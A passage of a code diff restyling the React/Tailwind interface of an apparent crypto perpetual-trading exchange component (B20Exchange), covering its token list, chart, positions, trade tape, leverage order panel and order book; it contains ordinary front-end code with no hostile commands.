+                                                                <span className={`text-[6px] font-black border px-1 py-0.5 rounded uppercase tracking-tighter ${toToken?.id === t.id ? 'bg-white/10 border-white/20 text-white/70' : 'bg-slate-100 border-slate-200 text-slate-400'}`}>{t.network.slice(0,3)}</span>
+                                                            )}
+                                                        </div>
+                                                        <p className={`text-[8px] font-bold uppercase tracking-tighter mt-0.5 ${toToken?.id === t.id ? 'text-white/60' : 'text-slate-400'}`}>Vol: ${formatB20Number(t.total_volume)}</p>
                                                     </div>
                                                 </div>
-                                                <div className="text-right">
-                                                    <p className={`text-[10px] font-black italic font-mono ${toToken?.id === t.id ? 'text-amber-400' : 'text-gray-900 group-hover/pair:text-amber-500'}`}>${(t.current_price||0).toFixed(t.current_price < 1 ? 6 : 2)}</p>
-                                                    <p className={`text-[8px] font-bold ${(t.price_change_percentage_24h||0) >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>{(t.price_change_percentage_24h||0).toFixed(2)}%</p>
+                                                <div className="text-right relative z-10">
+                                                    <p className={`text-[10px] font-black font-mono tracking-tighter ${toToken?.id === t.id ? 'text-white' : 'text-slate-900'}`}>
+                                                        ${t.current_price < 0.01 ? t.current_price.toFixed(6) : t.current_price?.toLocaleString()}
+                                                    </p>
+                                                    <div className="flex items-center justify-end gap-1 mt-0.5">
+                                                        <span className={`text-[8px] font-black ${toToken?.id === t.id ? 'text-white/80' : (t.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500')}`}>
+                                                            {t.price_change_percentage_24h >= 0 ? '↑' : '↓'} {Math.abs(t.price_change_percentage_24h || 0).toFixed(2)}%
+                                                        </span>
+                                                    </div>
                                                 </div>
                                             </button>
                                         ))}
                                     </div>
                                 </div>
-
-                                {/* 2. MAIN TERMINAL - CENTER */}
-                                <div className="xl:col-span-6 flex flex-col gap-6 min-h-0">
-                                    <div className="bg-white border border-gray-100 rounded-[3rem] p-7 flex flex-col h-[650px] shadow-2xl shadow-gray-200/40 relative overflow-hidden group">
-                                        <div className="flex items-center justify-between mb-5 px-3">
-                                            <div className="flex items-center gap-5">
-                                                <div className="flex bg-gray-50 p-1.5 rounded-2xl border border-gray-100 shadow-inner">
+                                {/* 2. MAIN EXECUTION HUB - CENTER */}
+                                <div className="xl:col-span-7 flex flex-col gap-5 min-h-0">
+                                    <div className="bg-white border border-slate-200 rounded-3xl p-6 flex flex-col h-[550px] shadow-sm relative overflow-hidden group">
+                                        <div className="flex items-center justify-between mb-4 px-2">
+                                            <div className="flex items-center gap-4">
+                                                <div className="flex bg-slate-50 p-1 rounded-xl border border-slate-200">
                                                     {['1m', '5m', '15m', '1h', '4h', '1D'].map(tf => (
-                                                        <button key={tf} className={`px-4 py-2 text-[10px] font-black rounded-xl transition-all ${tf === '15m' ? 'bg-white text-gray-900 shadow-md scale-105' : 'text-gray-400 hover:text-gray-600'}`}>{tf}</button>
+                                                        <button key={tf} className={`px-4 py-1.5 text-[9px] font-black rounded-lg transition-all ${tf === '15m' ? 'bg-indigo-600 text-white shadow-md' : 'text-slate-400 hover:text-slate-600'}`}>{tf}</button>
                                                     ))}
                                                 </div>
                                             </div>
-                                            <div className="flex items-center gap-3">
-                                                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                                <span className="text-[10px] font-black text-gray-900 uppercase tracking-widest opacity-80">Execution Node Sync</span>
+                                            <div className="flex items-center gap-4">
+                                                <div className="flex items-center gap-2 px-3 py-1.5 bg-indigo-50 rounded-lg border border-indigo-100">
+                                                    <div className="w-1.5 h-1.5 bg-indigo-600 rounded-full animate-pulse" />
+                                                    <span className="text-[8px] font-black text-indigo-600 uppercase tracking-widest">Global Node Sync</span>
+                                                </div>
+                                                <button className="p-2 text-slate-400 hover:text-slate-600 transition-colors">
+                                                    <Maximize2 className="w-4 h-4" />
+                                                </button>
                                             </div>
                                         </div>
-                                        <div className="flex-1 w-full h-[calc(100%-70px)] rounded-[2rem] overflow-hidden border border-gray-100 bg-gray-50/30 group-hover:border-amber-500/20 transition-all shadow-inner">
+                                        <div className="flex-1 w-full h-full rounded-2xl overflow-hidden border border-slate-100 bg-slate-50/30">
                                             {toToken && <TradingViewChart symbol={`${toToken.symbol}USDT`} theme="light" />}
                                         </div>
                                     </div>
 
-                                    <div className="flex-1 min-h-0 grid grid-cols-1 xl:grid-cols-3 gap-6">
-                                        <div className="xl:col-span-2 bg-white border border-gray-100 rounded-[3rem] shadow-2xl shadow-gray-200/40 flex flex-col overflow-hidden">
-                                        <div className="p-8 border-b border-gray-50 flex items-center justify-between bg-gray-50/20 backdrop-blur-sm sticky top-0 z-20">
-                                            <div className="flex flex-col gap-1">
-                                                <h3 className="text-[11px] font-black text-gray-900 uppercase tracking-[0.3em]">Institutional Positions</h3>
-                                                <span className="text-[8px] font-bold text-gray-400 tracking-widest">Active Orders (BETA-1.0)</span>
-                                            </div>
-                                            <button className="text-[10px] font-black text-rose-500 hover:text-rose-600 hover:bg-rose-100 uppercase tracking-widest flex items-center gap-3 px-8 py-3 bg-rose-50 rounded-2xl transition-all border border-rose-100 shadow-sm shadow-rose-500/5 active:scale-95">Liquidate All</button>
-                                        </div>
-                                        <div className="flex-1 overflow-auto p-6 custom-scrollbar">
-                                            {openPositions.length === 0 ? (
-                                                <div className="h-full flex flex-col items-center justify-center text-center opacity-40 py-24">
-                                                    <div className="w-20 h-20 bg-gray-50 rounded-[2.5rem] flex items-center justify-center mb-6 border border-gray-200/50">
-                                                        <Rocket className="w-10 h-10 text-gray-200" />
+                                    <div className="h-[280px] grid grid-cols-1 lg:grid-cols-2 gap-5">
+                                        {/* INSTITUTIONAL POSITIONS */}
+                                        <div className="bg-white border border-slate-200 rounded-3xl shadow-sm flex flex-col overflow-hidden">
+                                            <div className="p-6 border-b border-slate-100 flex items-center justify-between bg-slate-50/30">
+                                                <div className="flex items-center gap-3">
+                                                    <div className="p-2 bg-indigo-50 rounded-lg">
+                                                        <Rocket className="w-3.5 h-3.5 text-indigo-600" />
                                                     </div>
-                                                    <p className="text-[11px] font-black uppercase tracking-[0.3em] text-gray-400">No Institutional Positions Found</p>
-                                                    <p className="text-[9px] font-bold text-gray-300 mt-2 tracking-widest">Awaiting Alpha Execution...</p>
+                                                    <div className="flex flex-col">
+                                                        <h3 className="text-[10px] font-black text-slate-900 uppercase tracking-widest">Active Orders</h3>
+                                                        <span className="text-[7px] font-bold text-slate-400 tracking-widest uppercase">Verified Positions</span>
+                                                    </div>
                                                 </div>
-                                            ) : (
-                                                <table className="w-full text-left border-separate border-spacing-y-4">
-                                                    <thead>
-                                                        <tr className="text-[10px] font-black text-gray-400 uppercase tracking-[0.2em] opacity-60">
-                                                            <th className="px-5 pb-2">Asset</th>
-                                                            <th className="px-5 pb-2">Threshold</th>
-                                                            <th className="px-5 pb-2 text-right">P/L Performance</th>
-                                                            <th className="px-5 pb-2 text-right">Settlement</th>
-                                                        </tr>
-                                                    </thead>
-                                                    <tbody className="text-[11px] font-black">
+                                                <button className="text-[8px] font-black text-rose-600 hover:text-rose-700 uppercase tracking-widest px-4 py-2 bg-rose-50 rounded-xl border border-rose-100 transition-all active:scale-95">Liquidate All</button>
+                                            </div>
+                                            <div className="flex-1 overflow-auto p-4 custom-scrollbar">
+                                                {openPositions.length === 0 ? (
+                                                    <div className="h-full flex flex-col items-center justify-center text-center opacity-30 py-16">
+                                                        <Cpu className="w-10 h-10 text-slate-300 mb-4" />
+                                                        <p className="text-[9px] font-black uppercase tracking-widest text-slate-400">Scanning Local Ledger...</p>
+                                                    </div>
+                                                ) : (
+                                                    <div className="space-y-3">
                                                         {openPositions.map(pos => (
-                                                            <tr key={pos.id} className="bg-gray-50/50 hover:bg-gray-50 transition-all border border-transparent hover:border-gray-100 relative group">
-                                                                <td className="px-5 py-5 rounded-l-[1.5rem] border-l border-y border-gray-100/50">
-                                                                    <div className="flex items-center gap-4">
-                                                                        <div className={`p-2 rounded-xl ${pos.side === 'long' ? 'bg-emerald-50 text-emerald-500' : 'bg-rose-50 text-rose-500'}`}>
-                                                                            {pos.side === 'long' ? <ArrowUpRight className="w-4 h-4" /> : <ArrowDownRight className="w-4 h-4" />}
-                                                                        </div>
-                                                                        <div>
-                                                                            <p className="text-gray-950 uppercase text-xs">{pos.tokenSymbol}/USDT</p>
-                                                                            <p className={`text-[9px] font-black ${pos.side === 'long' ? 'text-emerald-500' : 'text-rose-500'}`}>{pos.leverage}X LEVERAGE</p>
-                                                                        </div>
+                                                            <div key={pos.id} className="bg-slate-50 border border-slate-200 rounded-2xl p-4 flex items-center justify-between group hover:border-indigo-500/30 transition-all">
+                                                                <div className="flex items-center gap-4">
+                                                                    <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${pos.side === 'long' ? 'bg-emerald-50 text-emerald-600' : 'bg-rose-50 text-rose-600'}`}>
+                                                                        {pos.side === 'long' ? <ArrowUpRight className="w-4 h-4" /> : <ArrowDownRight className="w-4 h-4" />}
                                                                     </div>
-                                                                </td>
-                                                                <td className="px-5 py-5 border-y border-gray-100/50 font-mono text-gray-900 text-xs">{pos.size}</td>
-                                                                <td className="px-5 py-5 border-y border-gray-100/50 text-right">
-                                                                    <div className="flex flex-col items-end">
-                                                                        <p className={`text-sm ${pos.pnlBase >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>+{pos.pnlBase?.toFixed(4)}</p>
-                                                                        <p className="text-[8px] font-bold text-gray-400 uppercase tracking-widest mt-1">Real-time PnL</p>
+                                                                    <div>
+                                                                        <div className="flex items-center gap-2">
+                                                                            <p className="text-[10px] font-black text-slate-900 uppercase">{pos.tokenSymbol}/USDT</p>
+                                                                            <span className="text-[8px] font-black px-1.5 py-0.5 rounded-md bg-white text-indigo-600 border border-slate-200">{pos.leverage}X</span>
+                                                                        </div>
+                                                                        <p className="text-[8px] font-bold text-slate-400 uppercase tracking-widest mt-0.5">Size: {pos.size}</p>
                                                                     </div>
-                                                                </td>
-                                                                <td className="px-5 py-5 rounded-r-[1.5rem] border-r border-y border-gray-100/50 text-right">
-                                                                    <button onClick={() => closePosition(pos.id)} className="px-6 py-3 bg-gray-950 text-white text-[10px] font-black uppercase rounded-xl shadow-xl shadow-black/20 hover:scale-105 active:scale-95 transition-all">Settle</button>
-                                                                </td>
-                                                            </tr>
+                                                                </div>
+                                                                <div className="text-right">
+                                                                    <p className={`text-xs font-black font-mono ${pos.pnlBase >= 0 ? 'text-emerald-600' : 'text-rose-600'}`}>
+                                                                        {pos.pnlBase >= 0 ? '+' : ''}{pos.pnlBase?.toFixed(4)}
+                                                                    </p>
+                                                                    <button onClick={() => closePosition(pos.id)} className="text-[8px] font-black text-rose-500 uppercase tracking-widest mt-1 hover:text-rose-600 transition-colors bg-rose-50 px-2 py-1 rounded-md border border-rose-100">Close Position</button>
+                                                                </div>
+                                                            </div>
                                                         ))}
-                                                    </tbody>
-                                                </table>
-                                            )}
-                                        </div>
-                                    </div>
-
-                                    {/* LIVE TRADES (TIME & SALES) */}
-                                    <div className="bg-white border border-gray-100 rounded-[3rem] shadow-2xl shadow-gray-200/40 flex flex-col overflow-hidden">
-                                        <div className="p-8 border-b border-gray-50 flex items-center justify-between bg-gray-50/20">
-                                            <div className="flex flex-col gap-1">
-                                                <h3 className="text-[11px] font-black text-gray-900 uppercase tracking-[0.3em]">Market History</h3>
-                                                <span className="text-[8px] font-bold text-gray-400 tracking-widest">Real-Time Tape (LIVE)</span>
-                                            </div>
-                                            <div className="flex items-center gap-2">
-                                                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                            </div>
-                                        </div>
-                                        <div className="flex-1 overflow-auto p-4 custom-scrollbar">
-                                            <div className="space-y-1">
-                                                <div className="grid grid-cols-3 text-[9px] font-black text-gray-400 uppercase tracking-widest px-4 pb-2">
-                                                    <span>Price</span>
-                                                    <span className="text-right">Size</span>
-                                                    <span className="text-right">Time</span>
-                                                </div>
-                                                {liveTrades.slice(0, 15).map((t, i) => (
-                                                    <div key={`htr-${i}`} className="grid grid-cols-3 items-center p-3 hover:bg-gray-50 rounded-xl transition-all group">
-                                                        <span className={`text-[10px] font-black font-mono ${t.trade_type === 'buy' ? 'text-emerald-500' : 'text-rose-500'}`}>
-                                                            ${(parseFloat(t.price_bnb) * (bnbPrice || 1) || toToken.current_price).toFixed(toToken.current_price < 1 ? 6 : 2)}
-                                                        </span>
-                                                        <span className="text-right text-[10px] font-black text-gray-600 font-mono">
-                                                            {parseFloat(t.amount_tokens).toFixed(3)}
-                                                        </span>
-                                                        <span className="text-right text-[9px] font-bold text-gray-300">
-                                                            {new Date(t.timestamp * 1000).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })}
-                                                        </span>
                                                     </div>
-                                                ))}
-                                                {liveTrades.length === 0 && (
-                                                    <div className="py-20 text-center opacity-30 italic text-[10px] font-bold uppercase tracking-widest">Awaiting Transactions...</div>
                                                 )}
                                             </div>
                                         </div>
+
+                                        {/* MARKET HISTORY / TAPE */}
+                                        <div className="bg-white border border-slate-200 rounded-3xl shadow-sm flex flex-col overflow-hidden">
+                                            <div className="p-6 border-b border-slate-100 flex items-center justify-between bg-slate-50/30">
+                                                <div className="flex items-center gap-3">
+                                                    <div className="p-2 bg-indigo-50 rounded-lg">
+                                                        <Zap className="w-3.5 h-3.5 text-indigo-600" />
+                                                    </div>
+                                                    <div className="flex flex-col">
+                                                        <h3 className="text-[10px] font-black text-slate-900 uppercase tracking-widest">Real-Time Tape</h3>
+                                                        <span className="text-[7px] font-bold text-slate-400 tracking-widest uppercase">Live Alpha Flow</span>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <div className="flex-1 overflow-auto p-4 custom-scrollbar">
+                                                <div className="space-y-1">
+                                                    <div className="grid grid-cols-3 text-[8px] font-black text-slate-300 uppercase tracking-widest px-3 pb-2">
+                                                        <span>Price</span>
+                                                        <span className="text-right">Size</span>
+                                                        <span className="text-right">Status</span>
+                                                    </div>
+                                                    {liveTrades.slice(0, 12).map((t, i) => (
+                                                        <div key={`htr-${i}`} className="grid grid-cols-3 items-center p-2.5 hover:bg-slate-50 rounded-xl transition-all group border border-transparent hover:border-slate-200">
+                                                            <span className={`text-[10px] font-black font-mono ${t.trade_type === 'buy' ? 'text-emerald-600' : 'text-rose-600'}`}>
+                                                                ${(parseFloat(t.price_bnb) * (bnbPrice || 1) || toToken.current_price).toFixed(toToken.current_price < 1 ? 6 : 2)}
+                                                            </span>
+                                                            <span className="text-right text-[10px] font-black text-slate-500 font-mono">
+                                                                {parseFloat(t.amount_tokens).toFixed(3)}
+                                                            </span>
+                                                            <span className="text-right text-[8px] font-bold text-slate-300 uppercase italic">
+                                                                Matched
+                                                            </span>
+                                                        </div>
+                                                    ))}
+                                                </div>
+                                            </div>
+                                        </div>
                                     </div>
                                 </div>
-                                </div>
 
-                                {/* 3. EXECUTION SIDEBAR - RIGHT */}
-                                <div className="xl:col-span-3 flex flex-col gap-6 min-h-0">
-                                    {/* PROFESSIONAL HUB */}
-                                    <div className="bg-gray-950 border border-gray-800 rounded-[3rem] flex flex-col min-h-0 shadow-[0_50px_100px_-10px_rgba(0,0,0,0.8)] relative overflow-hidden group p-8">
-                                        <div className="absolute inset-0 bg-gradient-to-b from-amber-500/10 via-transparent to-transparent opacity-30" />
+                                {/* 3. EXECUTION TERMINAL - RIGHT */}
+                                <div className="xl:col-span-3 flex flex-col gap-5 min-h-0">
+                                    {/* PROP-DESK ORDER PANEL */}
+                                    <div className="bg-white border border-slate-200 rounded-3xl flex flex-col min-h-0 shadow-sm relative overflow-hidden group p-6">
+                                        <div className="absolute inset-0 bg-gradient-to-b from-indigo-50/50 to-transparent pointer-events-none" />
                                         
-                                        <div className="flex items-center justify-between mb-8 relative z-10">
+                                        <div className="flex items-center justify-between mb-6 relative z-10">
                                             <div className="flex flex-col">
-                                                <h3 className="text-xs font-black text-white uppercase tracking-[0.4em]">Prop-Desk Hub</h3>
-                                                <span className="text-[8px] font-bold text-amber-500 uppercase tracking-widest mt-1">High-Frequency Active</span>
+                                                <h3 className="text-[11px] font-black text-slate-900 uppercase tracking-widest">Alpha Desk</h3>
+                                                <span className="text-[7px] font-bold text-indigo-600 uppercase tracking-widest mt-0.5">Prop-Terminal Active</span>
                                             </div>
-                                            <div className="flex bg-white/5 border border-white/10 p-1 rounded-xl">
-                                                <button onClick={() => setOrderType('market')} className={`px-5 py-2 text-[10px] font-black rounded-lg transition-all ${orderType === 'market' ? 'bg-amber-500 text-white shadow-lg shadow-amber-500/20' : 'text-gray-500 hover:text-gray-300'}`}>Market</button>
-                                                <button onClick={() => setOrderType('limit')} className={`px-5 py-2 text-[10px] font-black rounded-lg transition-all ${orderType === 'limit' ? 'bg-amber-500 text-white' : 'text-gray-500 hover:text-gray-300'}`}>Limit</button>
+                                            <div className="flex bg-slate-50 border border-slate-200 p-1 rounded-xl">
+                                                <button onClick={() => setOrderType('market')} className={`px-4 py-1.5 text-[9px] font-black rounded-lg transition-all ${orderType === 'market' ? 'bg-indigo-600 text-white shadow-md' : 'text-slate-400 hover:text-slate-600'}`}>Market</button>
+                                                <button onClick={() => setOrderType('limit')} className={`px-4 py-1.5 text-[9px] font-black rounded-lg transition-all ${orderType === 'limit' ? 'bg-indigo-600 text-white' : 'text-slate-400 hover:text-slate-600'}`}>Limit</button>
                                             </div>
                                         </div>
 
-                                        <div className="flex-1 overflow-y-auto custom-scrollbar space-y-8 relative z-10 pr-2">
-                                            <div className="grid grid-cols-2 p-1.5 bg-white/5 border border-white/10 rounded-[2.2rem] gap-2">
-                                                <button onClick={() => setTradeSide('long')} className={`py-6 rounded-2xl flex flex-col items-center gap-2 transition-all ${tradeSide === 'long' ? 'bg-emerald-600 text-white shadow-xl shadow-emerald-600/40 scale-[1.02]' : 'text-gray-500 hover:text-white hover:bg-white/5'}`}>
-                                                    <ArrowUpRight className="w-5 h-5" />
-                                                    <span className="text-[11px] font-black uppercase tracking-widest">Long</span>
+                                        <div className="flex-1 overflow-y-auto custom-scrollbar space-y-6 relative z-10 pr-1">
+                                            <div className="grid grid-cols-2 p-1 bg-slate-50 border border-slate-200 rounded-2xl gap-1">
+                                                <button onClick={() => setTradeSide('long')} className={`py-4 rounded-xl flex flex-col items-center gap-1.5 transition-all ${tradeSide === 'long' ? 'bg-emerald-600 text-white shadow-lg' : 'text-slate-400 hover:text-slate-600'}`}>
+                                                    <TrendingUp className="w-4 h-4" />
+                                                    <span className="text-[10px] font-black uppercase tracking-widest">Buy Long</span>
                                                 </button>
-                                                <button onClick={() => setTradeSide('short')} className={`py-6 rounded-2xl flex flex-col items-center gap-2 transition-all ${tradeSide === 'short' ? 'bg-rose-600 text-white shadow-xl shadow-rose-600/40 scale-[1.02]' : 'text-gray-500 hover:text-white hover:bg-white/5'}`}>
-                                                    <ArrowDownRight className="w-5 h-5" />
-                                                    <span className="text-[11px] font-black uppercase tracking-widest">Short</span>
+                                                <button onClick={() => setTradeSide('short')} className={`py-4 rounded-xl flex flex-col items-center gap-1.5 transition-all ${tradeSide === 'short' ? 'bg-rose-600 text-white shadow-lg' : 'text-slate-400 hover:text-slate-600'}`}>
+                                                    <TrendingDown className="w-4 h-4" />
+                                                    <span className="text-[10px] font-black uppercase tracking-widest">Sell Short</span>
                                                 </button>
                                             </div>
 
-                                            <div className="space-y-4">
+                                            <div className="space-y-3">
                                                 <div className="flex justify-between px-2">
-                                                    <span className="text-[9px] font-black text-gray-500 uppercase tracking-widest">Order Size</span>
-                                                    <span className="text-[9px] font-black text-amber-500 uppercase tracking-widest">Bal: 14.5 BNB</span>
+                                                    <span className="text-[8px] font-black text-slate-400 uppercase tracking-widest">Execution Size</span>
+                                                    <span className="text-[8px] font-black text-indigo-600 uppercase tracking-widest italic">Avail: 4.2 BNB</span>
                                                 </div>
-                                                <div className="relative">
+                                                <div className="relative group/input">
                                                     <input 
                                                         type="number" value={orderSize} onChange={(e) => setOrderSize(e.target.value)}
-                                                        className="w-full bg-white/5 border border-white/10 rounded-[2rem] py-5 px-8 text-xl font-black text-white outline-none focus:border-amber-500/50 transition-all font-mono"
+                                                        className="w-full bg-slate-50 border border-slate-200 rounded-2xl py-4 px-6 text-lg font-black text-slate-900 outline-none focus:bg-white focus:border-indigo-500/40 transition-all font-mono"
                                                         placeholder="0.00"
                                                     />
-                                                    <div className="absolute right-8 top-1/2 -translate-y-1/2 text-xs font-black text-gray-500 uppercase">BNB</div>
+                                                    <div className="absolute right-6 top-1/2 -translate-y-1/2 text-[10px] font-black text-slate-400 uppercase tracking-widest">BNB</div>
                                                 </div>
                                             </div>
 
-                                            <div className="bg-white/5 p-8 rounded-[2.5rem] border border-white/10 space-y-6">
-                                                <div className="flex justify-between items-end">
-                                                    <p className="text-[10px] font-black text-gray-500 uppercase tracking-widest">Levearge Intensity</p>
-                                                    <p className="text-2xl font-black text-amber-500 italic">{leverage}X</p>
+                                            <div className="bg-slate-50 p-5 rounded-2xl border border-slate-200 space-y-5">
+                                                <div className="flex justify-between items-center">
+                                                    <p className="text-[9px] font-black text-slate-500 uppercase tracking-widest">Leverage Intensity</p>
+                                                    <div className="flex items-center gap-2">
+                                                        <span className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Multiplier:</span>
+                                                        <p className="text-2xl font-black text-indigo-600 italic tracking-tighter">{leverage}X</p>
+                                                    </div>
                                                 </div>
-                                                <input 
-                                                    type="range" min="1" max="100" value={leverage} onChange={(e) => setLeverage(e.target.value)}
-                                                    className="w-full h-2 bg-white/10 rounded-full appearance-none cursor-pointer accent-amber-500 hover:accent-amber-400 transition-all" 
-                                                />
+                                                <div className="relative pt-2">
+                                                    <input 
+                                                        type="range" min="1" max="100" value={leverage} onChange={(e) => setLeverage(e.target.value)}
+                                                        className="w-full h-2 bg-slate-200 rounded-full appearance-none cursor-pointer accent-indigo-600 hover:accent-indigo-500 transition-all shadow-inner" 
+                                                    />
+                                                    <div className="grid grid-cols-4 gap-2 mt-5">
+                                                        {[10, 25, 50, 100].map(v => (
+                                                            <button 
+                                                                key={v} 
+                                                                onClick={() => setLeverage(v)} 
+                                                                className={`py-2 text-[9px] font-black rounded-lg border transition-all ${leverage == v ? 'bg-indigo-600 border-indigo-700 text-white shadow-lg' : 'bg-white border-slate-200 text-slate-400 hover:border-indigo-500 hover:text-slate-600'}`}
+                                                            >
+                                                                {v}X
+                                                            </button>
+                                                        ))}
+                                                    </div>
+                                                </div>
                                             </div>
 
-                                            <div className="space-y-5 px-3">
-                                                <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest">
-                                                    <span className="text-gray-500">Liquidation Price</span>
-                                                    <span className="text-rose-500 italic font-mono">${(toToken?.current_price * (tradeSide === 'long' ? (1 - 0.8 / leverage) : (1 + 0.8 / leverage))).toFixed(2)}</span>
+                                            <div className="space-y-4 px-2">
+                                                <div className="flex justify-between items-center text-[9px] font-black uppercase tracking-widest">
+                                                    <span className="text-slate-400">Liquidation Price</span>
+                                                    <span className="text-rose-600 font-mono italic font-bold">${(toToken?.current_price * (tradeSide === 'long' ? (1 - 0.8 / leverage) : (1 + 0.8 / leverage))).toFixed(4)}</span>
                                                 </div>
-                                                <div className="flex justify-between items-center text-[10px] font-black uppercase tracking-widest">
-                                                    <span className="text-gray-500">Protocol Execution Fee</span>
-                                                    <span className="text-white font-mono">$1.00 USDT</span>
+                                                <div className="flex justify-between items-center text-[9px] font-black uppercase tracking-widest">
+                                                    <span className="text-slate-400">Service Fee</span>
+                                                    <span className="text-slate-900 font-mono">0.02% Applied</span>
                                                 </div>
                                             </div>
                                         </div>
@@ -1693,50 +1880,56 @@ export default function B20Exchange() {
                                         <button 
                                             onClick={executePerpetualTrade}
                                             disabled={swapStatus === 'loading'}
-                                            className={`w-full py-8 mt-10 rounded-[2.5rem] text-[13px] font-black uppercase tracking-[0.5em] transition-all relative overflow-hidden group/exec ${tradeSide === 'long' ? 'bg-gradient-to-r from-emerald-600 to-emerald-400 shadow-[0_25px_60px_-10px_rgba(16,185,129,0.4)]' : 'bg-gradient-to-r from-rose-600 to-rose-400 shadow-[0_25px_60px_-10px_rgba(244,63,94,0.4)]'} text-white active:scale-95 flex items-center justify-center gap-6`}
+                                            className={`w-full py-5 mt-6 rounded-2xl text-[11px] font-black uppercase tracking-[0.4em] transition-all relative overflow-hidden group/exec ${tradeSide === 'long' ? 'bg-emerald-600 shadow-xl shadow-emerald-600/30' : 'bg-rose-600 shadow-xl shadow-rose-600/30'} text-white active:scale-95 flex items-center justify-center gap-3`}
                                         >
-                                            {swapStatus === 'loading' ? <Loader2 className="w-6 h-6 animate-spin" /> : (tradeSide === 'long' ? <ArrowUpRight className="w-6 h-6" /> : <ArrowDownRight className="w-6 h-6" />)}
-                                            {swapStatus === 'loading' ? 'SYNCING EXECUTION...' : `EXECUTE ${tradeSide.toUpperCase()}`}
+                                            {swapStatus === 'loading' ? <Loader2 className="w-5 h-5 animate-spin" /> : (tradeSide === 'long' ? <ArrowUpRight className="w-5 h-5" /> : <ArrowDownRight className="w-5 h-5" />)}
+                                            {swapStatus === 'loading' ? 'PROCESSING...' : `CONFIRM ${tradeSide.toUpperCase()}`}
                                         </button>
                                     </div>
 
-                                    {/* COMPACT ORDER BOOK */}
-                                    <div className="bg-white border border-gray-100 rounded-[3rem] h-[600px] flex flex-col shadow-2xl shadow-gray-200/40 relative overflow-hidden group">
-                                        <div className="p-7 border-b border-gray-50 flex items-center justify-between bg-gray-50/20">
+                                    {/* LIVE ORDER FLOW WALLS */}
+                                    <div className="bg-white border border-slate-200 rounded-3xl h-[550px] flex flex-col shadow-sm relative overflow-hidden group">
+                                        <div className="p-6 border-b border-slate-100 flex items-center justify-between bg-slate-50/30">
                                             <div className="flex items-center gap-3">
-                                                <Activity className="w-4 h-4 text-amber-500" />
-                                                <h3 className="text-[11px] font-black text-gray-900 uppercase tracking-widest">Live Order Flow</h3>
+                                                <BarChart3 className="w-3.5 h-3.5 text-indigo-600" />
+                                                <h3 className="text-[10px] font-black text-slate-900 uppercase tracking-widest">Institutional Book</h3>
                                             </div>
-                                            <div className="flex gap-2 items-center">
-                                                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse" />
-                                                <span className="text-[9px] font-black text-emerald-500 uppercase tracking-widest">Live</span>
+                                            <div className="flex items-center gap-3">
+                                                <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse" />
+                                                <span className="text-[8px] font-black text-emerald-600 uppercase tracking-widest">Active Flow</span>
                                             </div>
                                         </div>
                                         
-                                        <div className="flex-1 p-7 space-y-1.5 overflow-hidden flex flex-col justify-between bg-white">
-                                            <div className="space-y-1.5">
-                                                {orderBookData.asks.slice(0, 10).map((a, i) => (
-                                                    <div key={`ask-${i}`} className="flex justify-between items-center text-[10px] font-black group/row py-0.5 relative">
+                                        <div className="flex-1 p-5 overflow-hidden flex flex-col bg-slate-50/30">
+                                            {/* Header */}
+                                            <div className="grid grid-cols-2 text-[8px] font-black text-slate-300 uppercase tracking-widest mb-3 px-1">
+                                                <span>Price (USDT)</span>
+                                                <span className="text-right">Size ({toToken?.symbol})</span>
+                                            </div>
+
+                                            {/* Sells (Asks) */}
+                                            <div className="flex-1 overflow-hidden flex flex-col-reverse justify-end space-y-reverse space-y-0.5">
+                                                {orderBookData.asks.slice(0, 12).map((a, i) => (
+                                                    <div key={`ask-${i}`} className="flex justify-between items-center text-[9px] font-black py-0.5 relative group/row">
                                                         <span className="text-rose-500 font-mono tracking-tighter relative z-10">${a.price.toFixed(toToken?.current_price < 1 ? 6 : 2)}</span>
-                                                        <span className="text-gray-400 font-mono italic relative z-10">{a.amount.toFixed(3)}</span>
-                                                        <div className="absolute inset-y-0 right-0 bg-rose-500/5 rounded-lg transition-all duration-700" style={{ width: `${(a.cumulative / orderBookData.maxVolume) * 100}%` }} />
+                                                        <span className="text-slate-400 font-mono italic relative z-10">{a.amount.toFixed(2)}</span>
+                                                        <div className="absolute inset-y-0 right-0 bg-rose-500/5 rounded-sm transition-all duration-700" style={{ width: `${(a.cumulative / orderBookData.maxVolume) * 100}%` }} />
                                                     </div>
                                                 ))}
                                             </div>
 
-                                            <div className="py-5 border-y border-gray-100 flex items-center justify-between px-3 bg-gray-50/50 rounded-2xl my-3">
-                                                <div className="flex flex-col">
-                                                    <span className={`text-xl font-black italic tracking-tighter ${toToken?.price_change_percentage_24h >= 0 ? 'text-emerald-500' : 'text-rose-500'}`}>${toToken?.current_price?.toLocaleString()}</span>
-                                                    <span className="text-[8px] font-bold text-gray-400 uppercase tracking-[0.2em] mt-1">Live Oracle Feed</span>
+                                            {/* Center Price Indicator */}
+                                                <div className="text-right">
+                                                    <span className="text-[9px] font-black text-slate-300 font-mono italic">≈ {(toToken?.current_price / (bnbPrice || 1)).toFixed(6)} BNB</span>
                                                 </div>
-                                            </div>
 
-                                            <div className="space-y-1.5">
-                                                {orderBookData.bids.slice(0, 10).map((b, i) => (
-                                                    <div key={`bid-${i}`} className="flex justify-between items-center text-[10px] font-black group/row py-0.5 relative">
-                                                        <span className="text-emerald-500 font-mono tracking-tighter relative z-10">${b.price.toFixed(toToken?.current_price < 1 ? 6 : 2)}</span>
-                                                        <span className="text-gray-400 font-mono italic relative z-10">{b.amount.toFixed(3)}</span>
-                                                        <div className="absolute inset-y-0 right-0 bg-emerald-500/5 rounded-lg transition-all duration-700" style={{ width: `${(b.cumulative / orderBookData.maxVolume) * 100}%` }} />
+                                            {/* Buys (Bids) */}
+                                            <div className="flex-1 overflow-hidden flex flex-col justify-start space-y-0.5">
+                                                {orderBookData.bids.slice(0, 12).map((b, i) => (
+                                                    <div key={`bid-${i}`} className="flex justify-between items-center text-[9px] font-black py-0.5 relative group/row">
